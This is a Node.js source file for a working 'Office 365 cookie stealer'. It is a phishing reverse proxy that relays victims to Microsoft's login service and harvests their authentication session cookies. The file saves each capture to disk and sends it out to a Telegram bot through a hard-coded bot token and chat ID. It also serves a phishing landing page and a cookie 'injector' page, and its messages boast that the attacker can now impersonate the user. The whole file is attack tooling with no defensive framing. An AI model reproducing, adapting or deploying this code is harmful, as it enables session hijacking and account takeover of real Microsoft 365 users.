// =============================================
// OFFICE 365 COOKIE STEALER - REVERSE PROXY
// =============================================

const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

// =============================================
// ⚠️ CONFIGURATION - UPDATE THESE!
// =============================================
const CONFIG = {
    botToken: '8730465777:AAHmQqHT-aPYbAtxItqtDSAtoeGhcXIv-4g',  // YOUR TOKEN
    chatId: '7075480337'                                          // YOUR CHAT ID
};

// =============================================
// MIDDLEWARE
// =============================================
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

// =============================================
// CREATE STORAGE
// =============================================
const STORAGE_DIR = './captured_sessions';
fs.ensureDirSync(STORAGE_DIR);
console.log(`✅ Storage created: ${STORAGE_DIR}/`);

// =============================================
// TELEGRAM SENDER
// =============================================
async function sendToTelegram(message, fileData = null) {
    try {
        console.log('📤 Sending to Telegram...');
        
        // Send text message
        const textResponse = await fetch(
            `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            }
        );
        
        const textResult = await textResponse.text();
        console.log('📤 Text response:', textResult.substring(0, 200));
        
        // Send file if provided
        if (fileData) {
            const FormData = require('form-data');
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append(
                'document',
                JSON.stringify(fileData, null, 2),
                `session_${Date.now()}.json`
            );
            formData.append('caption', '📸 Captured Session Data - Office 365');
            
            const fileResponse = await fetch(
                `https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`,
                {
                    method: 'POST',
                    body: formData
                }
            );
            
            const fileResult = await fileResponse.text();
            console.log('📤 File response:', fileResult.substring(0, 200));
        }
        
        console.log('✅ Telegram sent successfully!');
        return true;
        
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// =============================================
// EXTRACT COOKIES
// =============================================
function extractCookies(headers) {
    const cookieHeader = headers['cookie'] || headers['Cookie'] || '';
    const cookies = {};
    
    if (cookieHeader) {
        const parts = cookieHeader.split(';');
        for (const part of parts) {
            const trimmed = part.trim();
            if (trimmed) {
                const [name, ...valueParts] = trimmed.split('=');
                cookies[name] = valueParts.join('=');
            }
        }
    }
    
    return cookies;
}

// =============================================
// EXTRACT OFFICE 365 COOKIES
// =============================================
function extractOfficeCookies(cookies) {
    const officeCookies = {};
    const targetNames = [
        'ESTSAUTHPERSISTENT',
        'ESTSAUTH',
        'ESTSAUTHLIGHT',
        'SignInState',
        'SignInPolicy',
        'LoginOptions',
        'MSTeams',
        'MSA',
        'AAD',
        'Microsoft',
        'Office',
        'Outlook',
        'SharePoint',
        'x-ms-gateway-slice',
        'stsservicecookie',
        'msal',
        'clientid',
        'login_hint'
    ];
    
    for (const [name, value] of Object.entries(cookies)) {
        for (const target of targetNames) {
            if (name.includes(target) || name.toUpperCase().includes(target.toUpperCase())) {
                officeCookies[name] = value;
                break;
            }
        }
    }
    
    return officeCookies;
}

// =============================================
// 🎯 PROXY MIDDLEWARE - CAPTURES COOKIES
// =============================================
const proxyMiddleware = createProxyMiddleware({
    target: 'https://login.microsoftonline.com',
    changeOrigin: true,
    secure: true,
    ws: true,
    cookieDomainRewrite: {
        '*': '' // Remove domain restriction
    },
    onProxyReq: (proxyReq, req, res) => {
        // Log the request
        console.log('\n🎯 PROXY REQUEST RECEIVED');
        console.log('🌐 URL:', req.url);
        console.log('📌 Method:', req.method);
        
        // Capture cookies from request headers
        const cookieHeader = proxyReq.getHeader('cookie') || req.headers.cookie || '';
        
        if (cookieHeader) {
            console.log('🍪 Cookies captured in proxy!');
            console.log('📋 Cookie string:', cookieHeader.substring(0, 200) + '...');
            
            // Extract cookies
            const cookies = extractCookies({ cookie: cookieHeader });
            const officeCookies = extractOfficeCookies(cookies);
            const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
            
            console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
            console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
            
            if (hasFullSession) {
                console.log('🔥 FULL OFFICE 365 SESSION CAPTURED IN PROXY!');
            }
            
            // Save to file
            const timestamp = new Date().toISOString();
            const sessionData = {
                timestamp: timestamp,
                method: 'PROXY',
                url: req.url,
                cookies: cookies,
                officeCookies: officeCookies,
                hasFullSession: hasFullSession,
                ip: req.ip || req.connection.remoteAddress,
                userAgent: req.headers['user-agent'] || 'unknown'
            };
            
            const filename = `session_proxy_${Date.now()}.json`;
            fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
            console.log(`📁 Saved: ${filename}`);
            
            // =============================================
            // SEND TO TELEGRAM IF OFFICE COOKIES FOUND
            // =============================================
            if (Object.keys(officeCookies).length > 0 || hasFullSession) {
                console.log('📤 Sending Office cookies to Telegram...');
                
                let message = '🎯 <b>PROXY CAPTURE - Office 365!</b>\n\n';
                message += `📅 <b>Time:</b> ${timestamp}\n`;
                message += `🌐 <b>URL:</b> ${req.url}\n`;
                message += `🖥️ <b>User-Agent:</b> ${(req.headers['user-agent'] || 'Unknown').substring(0, 80)}...\n\n`;
                message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
                message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
                
                if (hasFullSession) {
                    message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
                    message += '✅ You can now impersonate this user!\n\n';
                }
                
                if (Object.keys(officeCookies).length > 0) {
                    message += '\n🔑 <b>Critical Office Cookies:</b>\n';
                    for (const [name, value] of Object.entries(officeCookies)) {
                        const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
                        message += `• ${name}: ${shortValue}\n`;
                    }
                }
                
                await sendToTelegram(message, sessionData);
                
            } else {
                console.log('❌ No Office cookies found in proxy request.');
            }
        } else {
            console.log('❌ No cookies in proxy request');
        }
    },
    onProxyRes: (proxyRes, req, res) => {
        // Capture cookies from Microsoft's response
        const setCookie = proxyRes.headers['set-cookie'];
        if (setCookie) {
            console.log('\n🍪 MICROSOFT SET COOKIES:');
            console.log(setCookie.join('\n'));
            
            // Send to Telegram
            const message = '🍪 <b>New Cookies from Microsoft!</b>\n\n' +
                setCookie.map(c => `• ${c.substring(0, 100)}...`).join('\n');
            sendToTelegram(message);
            
            // Also try to extract from set-cookie
            const cookies = {};
            for (const cookie of setCookie) {
                const [name, ...valueParts] = cookie.split('=');
                if (name && valueParts) {
                    cookies[name] = valueParts.join('=').split(';')[0];
                }
            }
            
            const officeCookies = extractOfficeCookies(cookies);
            if (Object.keys(officeCookies).length > 0) {
                const sessionData = {
                    timestamp: new Date().toISOString(),
                    method: 'SET_COOKIE',
                    cookies: cookies,
                    officeCookies: officeCookies,
                    hasFullSession: cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH']
                };
                
                const filename = `session_setcookie_${Date.now()}.json`;
                fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
                console.log(`📁 Saved set-cookie: ${filename}`);
            }
        }
    },
    onError: (err, req, res) => {
        console.error('❌ Proxy error:', err.message);
        res.status(500).send('Proxy error occurred');
    }
});

// =============================================
// 🎯 PROXY ROUTE - VICTIM GOES HERE
// =============================================
app.use('/proxy', (req, res, next) => {
    console.log('\n🎯 PROXY ACCESS');
    console.log('📍 Client IP:', req.ip || req.connection.remoteAddress);
    console.log('🌐 URL:', req.url);
    next();
});

app.use('/proxy', proxyMiddleware);

// =============================================
// 🏠 LANDING PAGE (Phishing Entry)
// =============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// =============================================
// 🍪 INJECTOR PAGE
// =============================================
app.get('/injector.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'injector.html'));
});

// =============================================
// 📊 VIEW SESSIONS
// =============================================
app.get('/sessions', (req, res) => {
    const files = fs.readdirSync(STORAGE_DIR);
    const sessions = [];
    
    for (const file of files) {
        try {
            const data = fs.readJsonSync(path.join(STORAGE_DIR, file));
            sessions.push({
                file: file,
                timestamp: data.timestamp,
                url: data.url,
                cookieCount: Object.keys(data.cookies || {}).length,
                officeCount: Object.keys(data.officeCookies || {}).length,
                hasFullSession: data.hasFullSession || false
            });
        } catch (e) {}
    }
    
    res.json(sessions);
});

// =============================================
// 🧹 CLEAR SESSIONS
// =============================================
app.delete('/sessions', (req, res) => {
    const files = fs.readdirSync(STORAGE_DIR);
    let count = 0;
    for (const file of files) {
        try {
            fs.unlinkSync(path.join(STORAGE_DIR, file));
            count++;
        } catch (e) {}
    }
    res.json({ success: true, deleted: count });
});

// =============================================
// 🚀 START SERVER
// =============================================
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔥 OFFICE 365 REVERSE PROXY STEALER                     ║
║   🎯 Running on Railway!                                   ║
║                                                              ║
║   📡 Port: ${PORT}                                           ║
║   📁 Captures: ${STORAGE_DIR}/                              ║
║                                                              ║
║   📌 SEND VICTIM TO:                                       ║
║   🔗 https://your-railway-url/proxy                        ║
║                                                              ║
║                                                              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});

module.exports = { app };
